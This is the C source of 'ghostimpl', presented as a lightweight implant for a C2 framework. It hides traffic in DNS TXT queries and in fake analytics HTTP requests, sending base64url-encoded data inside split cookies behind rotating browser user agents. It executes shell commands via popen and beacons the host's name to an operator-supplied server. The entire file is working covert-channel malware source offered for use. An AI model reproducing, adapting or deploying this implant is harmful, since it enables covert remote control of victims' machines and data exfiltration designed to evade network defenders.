/*
 * ghostimpl — Ghostlink Lightweight C Implant
 * ~30KB, zero dependencies, DNS + HTTP covert channels
 *
 * Build: gcc -Os -s -o ghostimpl ghostimpl.c
 * Cross:  x86_64-w64-mingw32-gcc -Os -s -o ghostimpl.exe ghostimpl.c -lws2_32
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>

#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")
#endif

#define MAX_DNS_SIZE 512
#define MAX_LABEL    63
#define CHUNK_SIZE   48
#define MAX_HTTP_BUF 65536

typedef unsigned char u8;
typedef unsigned int u32;

static const char *b64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

void base64url_encode(const u8 *in, int len, char *out) {
    int i = 0, j = 0;
    while (i < len) {
        u32 a = i < len ? in[i++] : 0;
        u32 b = i < len ? in[i++] : 0;
        u32 c = i < len ? in[i++] : 0;
        u32 triple = (a << 16) | (b << 8) | c;
        out[j++] = b64_chars[(triple >> 18) & 0x3F];
        out[j++] = b64_chars[(triple >> 12) & 0x3F];
        out[j++] = b64_chars[(triple >> 6) & 0x3F];
        out[j++] = b64_chars[triple & 0x3F];
    }
    int rem = len % 3;
    if (rem) out[j - (3 - rem)] = '\0';
    else out[j] = '\0';
}

int base64url_decode(const char *in, u8 *out) {
    static int table_init = 0;
    static int table[256];
    if (!table_init) {
        for (int i = 0; i < 256; i++) table[i] = -1;
        for (int i = 0; i < 64; i++) table[(u8)b64_chars[i]] = i;
        table_init = 1;
    }
    int i = 0, j = 0, len = strlen(in);
    while (i < len) {
        u32 a = table[(u8)in[i++]];
        u32 b = table[(u8)in[i++]];
        u32 c = i < len ? table[(u8)in[i++]] : 0;
        u32 d = i < len ? table[(u8)in[i++]] : 0;
        u32 triple = (a << 18) | (b << 12) | (c << 6) | d;
        out[j++] = (triple >> 16) & 0xFF;
        if (in[i-2] != '\0') out[j++] = (triple >> 8) & 0xFF;
        if (in[i-1] != '\0') out[j++] = triple & 0xFF;
    }
    return j;
}

/* --- DNS channel --- */

int build_dns_query(const char *domain, const char *data, u8 *out) {
    char encoded[1024];
    base64url_encode((u8*)data, strlen(data), encoded);

    u8 *p = out;
    *p++ = (u8)(rand() >> 8); *p++ = (u8)rand();
    *p++ = 0x01; *p++ = 0x00;
    *p++ = 0x00; *p++ = 0x01;
    for (int i = 0; i < 6; i++) *p++ = 0x00;

    char fqdn[1024];
    snprintf(fqdn, sizeof(fqdn), "%s.%s", encoded, domain);

    char *label = strtok(fqdn, ".");
    while (label) {
        int l = strlen(label);
        if (l > 63) l = 63;
        *p++ = (u8)l;
        memcpy(p, label, l); p += l;
        label = strtok(NULL, ".");
    }
    *p++ = 0x00;
    *p++ = 0x00; *p++ = 0x10;
    *p++ = 0x00; *p++ = 0x01;

    return p - out;
}

int parse_txt_response(const u8 *resp, int len, char *out, int out_max) {
    if (len < 12) return 0;
    int ancount = (resp[6] << 8) | resp[7];
    if (ancount == 0) return 0;

    int offset = 12;
    while (offset < len && resp[offset] != 0) {
        int l = resp[offset];
        if (l & 0xC0) { offset += 2; break; }
        offset += l + 1;
    }
    if (offset < len && resp[offset] == 0) offset++;
    offset += 4;

    for (int i = 0; i < ancount && offset + 10 < len; i++) {
        if (resp[offset] & 0xC0) offset += 2;
        else {
            while (offset < len && resp[offset] != 0) {
                int l = resp[offset];
                if (l & 0xC0) { offset += 2; break; }
                offset += l + 1;
            }
            if (offset < len && resp[offset] == 0) offset++;
        }
        if (offset + 10 > len) break;
        int rtype = (resp[offset] << 8) | resp[offset+1];
        offset += 8;
        int rdlen = (resp[offset] << 8) | resp[offset+1];
        offset += 2;

        if (rtype == 16 && rdlen > 0 && offset + rdlen <= len) {
            int txtlen = resp[offset];
            if (txtlen + 1 <= rdlen) {
                char txt[512];
                memcpy(txt, resp + offset + 1, txtlen);
                txt[txtlen] = '\0';
                u8 decoded[512];
                int dlen = base64url_decode(txt, decoded);
                if (dlen > 0 && dlen < out_max) {
                    memcpy(out, decoded, dlen);
                    out[dlen] = '\0';
                    return dlen;
                }
            }
        }
        offset += rdlen;
    }
    return 0;
}

int dns_query(const char *server, int port, const char *domain, const char *data,
              char *response, int resp_max) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(server);

    u8 query[MAX_DNS_SIZE];
    int qlen = build_dns_query(domain, data, query);

    struct timeval tv = {3, 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    sendto(sock, query, qlen, 0, (struct sockaddr*)&addr, sizeof(addr));

    u8 buf[MAX_DNS_SIZE];
    int n = recv(sock, buf, MAX_DNS_SIZE, 0);
    close(sock);

    if (n < 0) return -1;
    return parse_txt_response(buf, n, response, resp_max);
}

/* --- HTTP channel --- */

static const char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
};

int http_connect(const char *host, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    struct hostent *he = gethostbyname(host);
    if (!he) { close(sock); return -1; }
    memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);

    struct timeval tv = {10, 0};
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }
    return sock;
}

int http_send(const char *host, int port, const u8 *data, int data_len,
              char *response, int resp_max) {
    int sock = http_connect(host, port);
    if (sock < 0) return -1;

    char encoded[4096];
    base64url_encode(data, data_len, encoded);

    int mid = strlen(encoded) / 2;
    char cookie1[2048], cookie2[2048];
    strncpy(cookie1, encoded, mid);
    cookie1[mid] = '\0';
    strcpy(cookie2, encoded + mid);

    const char *ua = user_agents[rand() % 3];

    char req[8192];
    int rlen = snprintf(req, sizeof(req),
        "GET /api/v2/analytics HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.9\r\n"
        "Cookie: session=%s; tracking=%s\r\n"
        "Connection: close\r\n"
        "\r\n",
        host, ua, cookie1, cookie2);

    send(sock, req, rlen, 0);

    char buf[MAX_HTTP_BUF];
    int total = 0;
    while (total < (int)sizeof(buf) - 1) {
        int n = recv(sock, buf + total, sizeof(buf) - total - 1, 0);
        if (n <= 0) break;
        total += n;
    }
    buf[total] = '\0';
    close(sock);

    char *body = strstr(buf, "\r\n\r\n");
    if (body && resp_max > 0) {
        body += 4;
        int blen = total - (body - buf);
        if (blen > resp_max - 1) blen = resp_max - 1;
        memcpy(response, body, blen);
        response[blen] = '\0';
        return blen;
    }
    return 0;
}

int http_recv(const char *host, int port, char *response, int resp_max) {
    int sock = http_connect(host, port);
    if (sock < 0) return -1;

    const char *ua = user_agents[rand() % 3];
    char req[2048];
    int rlen = snprintf(req, sizeof(req),
        "GET /api/v2/analytics HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: application/json\r\n"
        "Connection: close\r\n"
        "\r\n",
        host, ua);

    send(sock, req, rlen, 0);

    char buf[MAX_HTTP_BUF];
    int total = 0;
    while (total < (int)sizeof(buf) - 1) {
        int n = recv(sock, buf + total, sizeof(buf) - total - 1, 0);
        if (n <= 0) break;
        total += n;
    }
    buf[total] = '\0';
    close(sock);

    char *cookie_hdr = strstr(buf, "Set-Cookie: data=");
    if (cookie_hdr) {
        cookie_hdr += 17;
        char *end = strstr(cookie_hdr, ";");
        if (!end) end = strstr(cookie_hdr, "\r\n");
        if (end) {
            int clen = end - cookie_hdr;
            char encoded[4096];
            if (clen < (int)sizeof(encoded)) {
                memcpy(encoded, cookie_hdr, clen);
                encoded[clen] = '\0';
                u8 decoded[4096];
                int dlen = base64url_decode(encoded, decoded);
                if (dlen > 0 && dlen < resp_max) {
                    memcpy(response, decoded, dlen);
                    response[dlen] = '\0';
                    return dlen;
                }
            }
        }
    }

    char *body = strstr(buf, "\r\n\r\n");
    if (body) {
        body += 4;
        int blen = total - (body - buf);
        if (blen > resp_max - 1) blen = resp_max - 1;
        memcpy(response, body, blen);
        response[blen] = '\0';
        return blen;
    }
    return 0;
}

/* --- Command execution --- */

char *exec_command(const char *cmd) {
    static char buf[65536];
    FILE *fp = popen(cmd, "r");
    if (!fp) return NULL;
    int total = 0;
    while (total < (int)sizeof(buf) - 1) {
        int n = fread(buf + total, 1, sizeof(buf) - total - 1, fp);
        if (n <= 0) break;
        total += n;
    }
    buf[total] = '\0';
    pclose(fp);
    return buf;
}

/* --- Main --- */

int main(int argc, char *argv[]) {
    srand(time(NULL));
#ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
#endif

    if (argc < 4) {
        fprintf(stderr, "ghostimpl — Ghostlink Lightweight C Implant (DNS + HTTP)\n");
        fprintf(stderr, "usage: %s <mode> <server> <port> [domain/path] [command]\n", argv[0]);
        fprintf(stderr, "\n");
        fprintf(stderr, "  DNS mode:  %s dns  <dns_ip> <dns_port> <domain> [command]\n", argv[0]);
        fprintf(stderr, "  HTTP mode: %s http <host>   <port>     [command]\n", argv[0]);
        fprintf(stderr, "\n");
        fprintf(stderr, "  dns_ip      Ghostlink server IP (e.g. 10.0.0.5)\n");
        fprintf(stderr, "  domain      Authoritative domain (e.g. ns.jankesec.com)\n");
        fprintf(stderr, "  host        HTTP C2 server hostname or IP\n");
        fprintf(stderr, "  port        Server port\n");
        fprintf(stderr, "  command     Command to execute on target\n");
        return 1;
    }

    const char *mode = argv[1];
    const char *server = argv[2];
    int port = atoi(argv[3]);

    if (strcmp(mode, "http") == 0) {
        const char *command = argc > 4 ? argv[4] : NULL;

        if (command) {
            char *output = exec_command(command);
            if (!output) output = "(null)";

            printf("[*] executing via HTTP: %s\n", command);
            char response[65536];
            int n = http_send(server, port, (u8*)command, strlen(command),
                            response, sizeof(response));
            printf("[*] sent command via HTTP Cookie (%d bytes response)\n", n);

            sleep(1);

            char poll_resp[65536];
            int pn = http_recv(server, port, poll_resp, sizeof(poll_resp));
            if (pn > 0) {
                printf("[*] response: %s\n", poll_resp);
            }

            printf("--- command output ---\n%s\n", output);
        } else {
            char hostname[256];
            gethostname(hostname, sizeof(hostname));

            printf("[*] HTTP beacon to %s:%d\n", server, port);
            char data[512];
            snprintf(data, sizeof(data), "hostname:%s", hostname);

            char response[65536];
            int n = http_send(server, port, (u8*)data, strlen(data),
                            response, sizeof(response));
            printf("[*] beacon sent, response: %d bytes\n", n);
            if (n > 0) printf("[*] %s\n", response);
        }
    } else {
        /* DNS mode */
        if (argc < 5) {
            fprintf(stderr, "DNS mode requires domain: %s dns <ip> <port> <domain> [cmd]\n", argv[0]);
            return 1;
        }
        const char *domain = argv[4];
        const char *command = argc > 5 ? argv[5] : NULL;

        if (command) {
            char *output = exec_command(command);
            if (!output) output = "(null)";

            printf("[*] executing via DNS: %s\n", command);
            char response[65536];

            int n = dns_query(server, port, domain, command, response, sizeof(response));
            printf("[*] sent command via DNS TXT (%d bytes)\n", n > 0 ? n : 0);

            sleep(1);

            char poll_resp[65536];
            int pn = dns_query(server, port, domain, "poll", poll_resp, sizeof(poll_resp));
            if (pn > 0) {
                printf("[*] response: %s\n", poll_resp);
            }

            printf("--- command output ---\n%s\n", output);
        } else {
            char hostname[256];
            gethostname(hostname, sizeof(hostname));
            char data[512];
            snprintf(data, sizeof(data), "hostname:%s", hostname);

            char response[65536];
            int n = dns_query(server, port, domain, data, response, sizeof(response));
            printf("[*] beacon sent, response: %d bytes\n", n);
            if (n > 0) printf("[*] %s\n", response);
        }
    }

    return 0;
}
